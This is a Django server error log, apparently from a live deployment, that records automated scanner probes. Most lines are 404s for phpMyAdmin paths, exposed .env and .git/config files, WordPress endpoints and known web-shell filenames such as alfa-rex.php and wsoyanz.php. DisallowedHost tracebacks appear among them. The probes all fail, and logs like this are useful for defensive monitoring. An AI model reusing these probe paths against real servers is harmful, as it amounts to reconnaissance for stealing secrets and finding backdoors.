Not Found: /phpMyAdmin-5.2.1-all-languages/index.php
Not Found: /administrator/db/index.php
Not Found: /php-myadmin/index.php
Not Found: /sqlmanager/index.php
Not Found: /phpMyAdmin-5/index.php
Not Found: /sql/sqlweb/index.php
Not Found: /phpMyAdmin-5.1.1/index.php
Not Found: /pma/index.php
Not Found: /phpmyadmin/index.php
Not Found: /administrator/web/index.php
Not Found: /phpmyadmin1/index.php
Not Found: /db/webdb/index.php
Not Found: /db/phpMyAdmin/index.php
Not Found: /phpmyadmin2021/index.php
Not Found: /dbadmin/index.php
Not Found: /program/index.php
Not Found: /phpMyAdmin-latest/index.php
Not Found: /administrator/pma/index.php
Not Found: /sql/phpmyadmin4/index.php
Not Found: /myadmin/index.php
Not Found: /mysql/db/index.php
Not Found: /db/phpMyAdmin3/index.php
Not Found: /2phpmyadmin/index.php
Not Found: /phpmyadmin2022/index.php
Not Found: /phpmyadmin3/index.php
Not Found: /phpMyAdmin6.0/index.php
Not Found: /phpMyAdmin4/index.php
Not Found: /db/db-admin/index.php
Not Found: /db/phpmyadmin5/index.php
Not Found: /sql/phpmy-admin/index.php
Not Found: /phpMyAdmin/index.php
Not Found: /phpmy/index.php
Not Found: /_phpmyadmin/index.php
Not Found: /db/dbadmin/index.php
Not Found: /mysqlmanager/index.php
Not Found: /phpMyAdmin-5.2/index.php
Not Found: /sql/myadmin/index.php
Not Found: /phpMyAdmin-5.1.0/index.php
Not Found: /db/myadmin/index.php
Not Found: /phpMyAdmin-5.2.0/index.php
Not Found: /phpMyAdmin5.2/index.php
Not Found: /db/phpMyAdmin-4/index.php
Not Found: /sql/phpmyadmin5/index.php
Not Found: /phpmyadmin2018/index.php
Not Found: /phpMyAdmin_/index.php
Not Found: /index.php
Not Found: /phpmy-admin/index.php
Not Found: /phpMyAdmin-4.9.10-all-languages/index.php
Not Found: /mysql/dbadmin/index.php
Not Found: /mysql-admin/index.php
Not Found: /phpmyadmin2017/index.php
Not Found: /administrator/phpmyadmin/index.php
Not Found: /phppma/index.php
Not Found: /mysql/mysqlmanager/index.php
Not Found: /sql/phpmanager/index.php
Not Found: /sql/sql-admin/index.php
Not Found: /database/index.php
Not Found: /MyAdmin/index.php
Not Found: /_phpMyAdmin/index.php
Not Found: /PMA/index.php
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /actuator/health
Not Found: /device.rsp
Not Found: /.env
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /prod/.git/config
Not Found: /logs/archived/.git/config
Not Found: /server/backup/.git/config
Not Found: /integration/.git/config
Not Found: /src/.git/config
Not Found: /lib/js/.git/config
Not Found: /v2/.git/config
Not Found: /scripts/.git/config
Not Found: /modules/api/.git/config
Not Found: /staging_area/.git/config
Not Found: /temp/.git/config
Not Found: /tools/.git/config
Not Found: /client/.git/config
Not Found: /templates/.git/config
Not Found: /project/.git/config
Not Found: /public/.git/config
Not Found: /www/.git/config
Not Found: /modules/utils/.git/config
Not Found: /robots.txt
Not Found: /index.html
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /device.rsp
Not Found: /conf.yaml
Not Found: /device.rsp
Not Found: /templates/.git/config
Not Found: /data/staging/.git/config
Not Found: /lib/js/.git/config
Not Found: /.env.cache
Not Found: /ci/.git/config
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /portal/redlion
Not Found: /robots.txt
Not Found: /config.json
Not Found: /device.rsp
Not Found: /device.rsp
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env
Not Found: /.env.template
Not Found: /.env.staging.local
Not Found: /config/.git/config
Not Found: /cms/.git/config
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /actuator/gateway/routes
Not Found: /wp-includes/ID3/license.txt
Not Found: /feed/
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /2021/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /api/tags
Not Found: /tools/.git/config
Not Found: /v3/.git/config
Not Found: /v1/.git/config
Not Found: /v2/.git/config
Not Found: /staging_environment/.git/config
Not Found: /repo/.git/config
Not Found: /ci/cd/.git/config
Not Found: /client/.git/config
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /ads.txt
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /autoload_classmap.php
Not Found: /post.php
Not Found: /1.php
Not Found: /flower.php
Not Found: /admin.php
Not Found: /file.php
Not Found: /meta.php
Not Found: /index.php
Not Found: /about.php
Not Found: /randkeyword.php
Not Found: /goods.php
Not Found: /hehe.php
Not Found: /user.php
Not Found: /wp-2019.php
Not Found: /chosen.php
Not Found: /functions.php
Not Found: /cron.php
Not Found: /edit.php
Not Found: /gecko-new.php
Not Found: /cookie.php
Not Found: /xleet.php
Not Found: /spip.php
Not Found: /22.php
Not Found: /room.php
Not Found: /disagreed.php
Not Found: /text.php
Not Found: /alfa-rex.php
Not Found: /alfa-rex.php7
Not Found: /feeds.php
Not Found: /radio.php
Not Found: /dropdown.php
Not Found: /defaults.php
Not Found: /system.php
Not Found: /xmlrpc.php
Not Found: /xmlrpc.php0
Not Found: /colors.php
Not Found: /updates.php
Not Found: /alfa-rex1.php
Not Found: /wp-index.php
Not Found: /wp-admin.php
Not Found: /alfa.php
Not Found: /alfanew.php7
Not Found: /locale.php
Not Found: /wxo.php
Not Found: /colour.php
Not Found: /files.php
Not Found: /install.php
Not Found: /wp-contentt.php
Not Found: /config.php7
Not Found: /config.php
Not Found: /theme.php
Not Found: /block-bindings.php
Not Found: /class_api.php
Not Found: /inputs.php
Not Found: /root.php
Not Found: /menu.php
Not Found: /plugin.php
Not Found: /cloud.php
Not Found: /configs.php
Not Found: /wp-configs.php
Not Found: /update.php
Not Found: /2.php
Not Found: /input.php
Not Found: /aaa.php
Not Found: /.git/config
Not Found: /phpmyadmin/index.php
Not Found: /wp-content/plugins/hellopress/wp_filemanager.php
Not Found: /403.php
Not Found: /content.php
Not Found: /wp-content/plugins/not/includes/about.php
Not Found: /wp-content/plugins/simple/simple.php
Not Found: /wp-content/plugins/wp-theme-editor/include.php
Not Found: /wp-content/themes/aahana/json.php
Not Found: /admin.php
Not Found: /wp-content/plugins/awesome-coming-soon/come.php
Not Found: /wp-content/plugins/wp-conflg.php
Not Found: /berlin.php
Not Found: /wp-includes/Requests/about.php
Not Found: /wp-includes/style-engine/about.php
Not Found: /wp-includes/rest-api/about.php
Not Found: /wp-includes/SimplePie/about.php
Not Found: /wp-content/banners/about.php
Not Found: /wp-content/about.php
Not Found: /.well-known/about.php
Not Found: /wp-includes/Text/about.php
Not Found: /wp-includes/ID3/about.php
Not Found: /img/about.php
Not Found: /wp-content/languages/about.php
Not Found: /wp-includes/customize/about.php
Not Found: /wp-includes.bak/html-api/about.php
Not Found: /wp-includes/widgets/about.php
Not Found: /wp-includes/IXR/about.php
Not Found: /wp-admin/js/about.php
Not Found: /.well-known/pki-validation/about.php
Not Found: /wp-includes/pomo/about.php
Not Found: /wp-includes/block-patterns/about.php
Not Found: /wp-content/updraft/about.php
Not Found: /wp-content/upgrade-temp-backup/about.php
Not Found: /wp-content/themes/about.php
Not Found: /wp-admin/includes/about.php
Not Found: /images/about.php
Not Found: /wp-content/blogs.dir/about.php
Not Found: /wp-includes/images/about.php
Not Found: /wp-includes/about.php
Not Found: /cgi-bin/about.php
Not Found: /wp-content/gallery/about.php
Not Found: /wp-includes/blocks/about.php
Not Found: /wp-admin/css/about.php
Not Found: /wp-admin/images/about.php
Not Found: /.well-known/pki-validation/cloud.php
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/network/cloud.php
Not Found: /cloud.php
Not Found: /cgi-bin/cloud.php
Not Found: /wp-content/updates.php
Not Found: /css/cloud.php
Not Found: /wp-admin/user/cloud.php
Not Found: /img/cloud.php
Not Found: /wp-admin/css/colors/coffee/cloud.php
Not Found: /wp-admin/images/cloud.php
Not Found: /avaa.php
Not Found: /images/cloud.php
Not Found: /wp-admin/js/widgets/cloud.php
Not Found: /wp-includes/Requests/Text/admin.php
Not Found: /wp-admin/css/colors/cloud.php
Not Found: /wp-admin/includes/cloud.php
Not Found: /wp-admin/css/colors/blue/cloud.php
Not Found: /wp-admin/cloud.php
Not Found: /updates.php
Not Found: /libraries/legacy/updates.php
Not Found: /libraries/phpmailer/updates.php
Not Found: /libraries/vendor/updates.php
Not Found: /alfa-rex.php7
Not Found: /alfanew.php
Not Found: /wp-content/plugins/Cache/Cache.php
Not Found: /wp-admin/js/widgets/about.php7
Not Found: /wp-p.php7
Not Found: /wp-admin/repeater.php
Not Found: /wp-includes/repeater.php
Not Found: /wp-content/repeater.php
Not Found: /wsoyanz.php
Not Found: /yanz.php
Not Found: /wp-admin/js/about.php
Not Found: /wp-content/plugins/seoo/wsoyanz.php
Not Found: /wp-content/plugins/seoo/wsoyanz1.php
Not Found: /cache-compat.php
Not Found: /ajax-actions.php
Not Found: /wp-admin/ajax-actions.php
Not Found: /wp-consar.php
Not Found: /repeater.php
Not Found: /admin-post.php
Not Found: /wp-admin/maint/maint/ajax-actions.php
Not Found: /wp-admin/dropdown.php
Not Found: /wp-admin/css/index.php
Not Found: /dropdown.php
Not Found: /about.php
Not Found: /admin.php
Not Found: /about.php7
Not Found: /alfanew.php7
Not Found: /adminfuns.php7
Not Found: /ebs.php7
Not Found: /ws.php7
Not Found: /alfanew2.php7
Not Found: /alfa-rex2.php7
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/images/index.php
Not Found: /wp-admin/css/colors/index.php
Not Found: /wp-content/themes/pridmag/db.php
Not Found: /wp-content/themes/seotheme/mar.php
Not Found: /wp-content/plugins/linkpreview/db.php
Not Found: /wp-content/themes/seotheme/db.php
Not Found: /wp-content/plugins/seoplugins/db.php
Not Found: /wp-content/plugins/seoplugins/mar.php
Not Found: /.well-known/pki-validation/xmrlpc.php
Not Found: /.well-known/acme-challenge/xmrlpc.php
Not Found: /wp-admin/network/xmrlpc.php
Not Found: /xmrlpc.php
Not Found: /cgi-bin/xmrlpc.php
Not Found: /css/xmrlpc.php
Not Found: /wp-admin/user/xmrlpc.php
Not Found: /img/xmrlpc.php
Not Found: /wp-admin/css/colors/coffee/xmrlpc.php
Not Found: /wp-admin/images/xmrlpc.php
Not Found: /images/xmrlpc.php
Not Found: /wp-admin/js/widgets/xmrlpc.php
Not Found: /wp-admin/css/colors/xmrlpc.php
Not Found: /wp-admin/includes/xmrlpc.php
Not Found: /wp-admin/css/colors/blue/xmrlpc.php
Not Found: /wp-admin/xmrlpc.php
Not Found: /403.php
Not Found: /content.php
Not Found: /wp-content/plugins/not/includes/about.php
Not Found: /wp-content/plugins/simple/simple.php
Not Found: /wp-content/plugins/wp-theme-editor/include.php
Not Found: /wp-content/themes/aahana/json.php
Not Found: /admin.php
Not Found: /wp-content/plugins/awesome-coming-soon/come.php
Not Found: /wp-content/plugins/wp-conflg.php
Not Found: /berlin.php
Not Found: /wp-includes/Requests/about.php
Not Found: /wp-includes/style-engine/about.php
Not Found: /wp-includes/rest-api/about.php
Not Found: /wp-includes/SimplePie/about.php
Not Found: /wp-content/banners/about.php
Not Found: /wp-content/about.php
Not Found: /.well-known/about.php
Not Found: /wp-includes/Text/about.php
Not Found: /wp-includes/ID3/about.php
Not Found: /img/about.php
Not Found: /wp-content/languages/about.php
Not Found: /wp-includes/customize/about.php
Not Found: /wp-includes.bak/html-api/about.php
Not Found: /wp-includes/widgets/about.php
Not Found: /wp-includes/IXR/about.php
Not Found: /wp-admin/js/about.php
Not Found: /.well-known/pki-validation/about.php
Not Found: /wp-includes/pomo/about.php
Not Found: /wp-includes/block-patterns/about.php
Not Found: /wp-content/updraft/about.php
Not Found: /wp-content/upgrade-temp-backup/about.php
Not Found: /wp-content/themes/about.php
Not Found: /wp-admin/includes/about.php
Not Found: /images/about.php
Not Found: /wp-content/blogs.dir/about.php
Not Found: /wp-includes/images/about.php
Not Found: /wp-includes/about.php
Not Found: /cgi-bin/about.php
Not Found: /wp-content/gallery/about.php
Not Found: /wp-includes/blocks/about.php
Not Found: /wp-admin/css/about.php
Not Found: /wp-admin/images/about.php
Not Found: /.well-known/pki-validation/cloud.php
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/network/cloud.php
Not Found: /cloud.php
Not Found: /cgi-bin/cloud.php
Not Found: /wp-content/updates.php
Not Found: /css/cloud.php
Not Found: /wp-admin/user/cloud.php
Not Found: /img/cloud.php
Not Found: /wp-admin/css/colors/coffee/cloud.php
Not Found: /wp-admin/images/cloud.php
Not Found: /avaa.php
Not Found: /images/cloud.php
Not Found: /wp-admin/js/widgets/cloud.php
Not Found: /wp-includes/Requests/Text/admin.php
Not Found: /wp-admin/css/colors/cloud.php
Not Found: /wp-admin/includes/cloud.php
Not Found: /wp-admin/css/colors/blue/cloud.php
Not Found: /wp-admin/cloud.php
Not Found: /updates.php
Not Found: /libraries/legacy/updates.php
Not Found: /libraries/phpmailer/updates.php
Not Found: /libraries/vendor/updates.php
Not Found: /alfa-rex.php7
Not Found: /alfanew.php
Not Found: /wp-content/plugins/Cache/Cache.php
Not Found: /wp-admin/js/widgets/about.php7
Not Found: /wp-p.php7
Not Found: /wp-admin/repeater.php
Not Found: /wp-includes/repeater.php
Not Found: /wp-content/repeater.php
Not Found: /wsoyanz.php
Not Found: /yanz.php
Not Found: /wp-admin/js/about.php
Not Found: /wp-content/plugins/seoo/wsoyanz.php
Not Found: /wp-content/plugins/seoo/wsoyanz1.php
Not Found: /cache-compat.php
Not Found: /ajax-actions.php
Not Found: /wp-admin/ajax-actions.php
Not Found: /wp-consar.php
Not Found: /repeater.php
Not Found: /admin-post.php
Not Found: /wp-admin/maint/maint/ajax-actions.php
Not Found: /wp-admin/dropdown.php
Not Found: /wp-admin/css/index.php
Not Found: /dropdown.php
Not Found: /about.php
Not Found: /admin.php
Not Found: /about.php7
Not Found: /alfanew.php7
Not Found: /adminfuns.php7
Not Found: /ebs.php7
Not Found: /ws.php7
Not Found: /alfanew2.php7
Not Found: /alfa-rex2.php7
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/images/index.php
Not Found: /wp-admin/css/colors/index.php
Not Found: /wp-content/themes/pridmag/db.php
Not Found: /wp-content/themes/seotheme/mar.php
Not Found: /wp-content/plugins/linkpreview/db.php
Not Found: /wp-content/themes/seotheme/db.php
Not Found: /wp-content/plugins/seoplugins/db.php
Not Found: /wp-content/plugins/seoplugins/mar.php
Not Found: /.well-known/pki-validation/xmrlpc.php
Not Found: /.well-known/acme-challenge/xmrlpc.php
Not Found: /wp-admin/network/xmrlpc.php
Not Found: /xmrlpc.php
Not Found: /cgi-bin/xmrlpc.php
Not Found: /css/xmrlpc.php
Not Found: /wp-admin/user/xmrlpc.php
Not Found: /img/xmrlpc.php
Not Found: /wp-admin/css/colors/coffee/xmrlpc.php
Not Found: /wp-admin/images/xmrlpc.php
Not Found: /images/xmrlpc.php
Not Found: /wp-admin/js/widgets/xmrlpc.php
Not Found: /wp-admin/css/colors/xmrlpc.php
Not Found: /wp-admin/includes/xmrlpc.php
Not Found: /wp-admin/css/colors/blue/xmrlpc.php
Not Found: /wp-admin/xmrlpc.php
Not Found: /api/bin/123123
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env
Not Found: /api/.env
Not Found: /phpinfo.php
Not Found: /phpinfo
Not Found: /.env.save
Not Found: /.env.prod
Not Found: /login/.env
Not Found: /local/.env
Not Found: /dev/.env
Not Found: /application/.env
Not Found: /php_info.php
Not Found: /_profiler/phpinfo
Not Found: /config/.env
Not Found: /backend/.env
Not Found: /docker/.env
Forbidden (CSRF cookie not set.): /
Not Found: /wp-content/plugins/essential-addons-for-elementor-lite/readme.txt
Not Found: /libs/js/iframe.js
Not Found: /robots.txt
Not Found: /.env
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-content/uploads/
Not Found: /wp-includes/
Not Found: /wp-includes/css/
Not Found: /wp-includes/ID3/
Not Found: /wp-includes/IXR/
Not Found: /wp-includes/Requests/
Not Found: /wp-includes/SimplePie/
Not Found: /wp-includes/Text/
Not Found: /wp-content/mu-plugins-old/
Not Found: /wp-content/themes/classic/inc/
Not Found: /wp-content/plugins/ninja-forms/
Not Found: /wp-content/mu-plugins/
Not Found: /wp-includes/Text/Diff/Renderer/
Not Found: /wp-includes/blocks/
Not Found: /wp-includes/certificates/
Not Found: /wp-includes/customize/
Not Found: /wp-includes/fonts/
Not Found: /wp-includes/images/
Not Found: /.well-known/
Not Found: /ALFA_DATA/
Not Found: /.well-knownold/
Not Found: /.well-known/acme-challenge/
Not Found: /cgi-bin/
Not Found: /uploads/
Not Found: /upload/
Not Found: /Admin/uploads/
Not Found: /images/
Not Found: /assets/
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/
Not Found: /upload/image/
Not Found: /assets/images/
Not Found: /Public/
Not Found: /vendor/
Not Found: /local/
Not Found: /modules/
Not Found: /Site/
Not Found: /system/
Not Found: /template/
Not Found: /shop/
Not Found: /files/
Not Found: /include/
Not Found: /Assets/
Not Found: /images/stories/
Not Found: /plugins/
Not Found: /php/
Not Found: /wp-includes/assets/
Not Found: /wp-includes/Text/Diff/Engine/
Not Found: /wp-includes/block-patterns/
Not Found: /wp-includes/Text/Diff/
Not Found: /wp-includes/block-supports/
Not Found: /wp-includes/SimplePie/Cache/
Not Found: /wp-includes/SimplePie/Content/Type/
Not Found: /wp-includes/SimplePie/Content/
Not Found: /wp-includes/rest-api/endpoints/
Not Found: /wp-includes/rest-api/fields/
Not Found: /wp-includes/Requests/Cookie/
Not Found: /wp-includes/Requests/Proxy/
Not Found: /wp-includes/Requests/Response/
Not Found: /wp-includes/Requests/Transport/
Not Found: /wp-includes/Requests/Utility/
Not Found: /wp-includes/js/codemirror/
Not Found: /wp-includes/Requests/Exception/HTTP/
Not Found: /wp-includes/js/crop/
Not Found: /wp-includes/images/crystal/
Not Found: /wp-includes/images/media/
Not Found: /wp-includes/images/smilies/
Not Found: /wp-includes/images/wlw/
Not Found: /wp-includes/rest-api/search/
Not Found: /wp-includes/Requests/Exception/
Not Found: /wp-includes/Requests/Auth/
Not Found: /wp-includes/sodium_compat/src/
Not Found: /wp-includes/sitemaps/providers/
Not Found: /wp-includes/Text/Diff/Engine/Engine/
Not Found: /wp-includes/html-api/
Not Found: /wp-includes/js/
Not Found: /wp-includes/php-compat/
Not Found: /wp-includes/PHPMailer/
Not Found: /wp-includes/pomo/
Not Found: /wp-includes/random_compat/
Not Found: /wp-includes/rest-api/
Not Found: /wp-includes/sitemaps/
Not Found: /wp-includes/sodium_compat/
Not Found: /wp-includes/style-engine/
Not Found: /wp-includes/theme-compat/
Not Found: /wp-includes/widgets/
Not Found: /wp-admin/css/colors/ectoplasm/
Not Found: /wp-admin/css/colors/
Not Found: /sites/default/files/
Not Found: /modules/mod_simplefileuploadv1.3/elements/
Not Found: /components/
Not Found: /wp-admin/css/
Not Found: /wp-admin/images/
Not Found: /wp-admin/maint/
Not Found: /wp-admin/meta/
Not Found: /wp-admin/network/
Not Found: /wp-admin/user/
Not Found: /wp-content/
Not Found: /wp-content/plugins/
Not Found: /wp-content/themes/
Not Found: /wp-admin/includes/
Not Found: /wp-admin/
Not Found: /wp-content/upgrade/
Not Found: /cgi-bin/luci/;stok=/locale
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /ads.txt
Not Found: /ads.txt
Not Found: /api/tags
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /device.rsp
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /config/.git/config
Not Found: /.env.testing
Not Found: /public/.git/config
Not Found: /.env.development.local
Bad Request: /contact/
Forbidden (CSRF token missing.): /contact/
Not Found: /contact.html
Not Found: /device.rsp
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /contact/contact.html
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /wp-includes/js/jquery/jquery.js
Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /geoserver/web/
Not Found: /project/backend/.git/config
Not Found: /data/staging/.git/config
Not Found: /devops/.git/config
Not Found: /.env.config
Not Found: /docker/.git/config
Not Found: /infra/.git/config
Not Found: /.env.orig
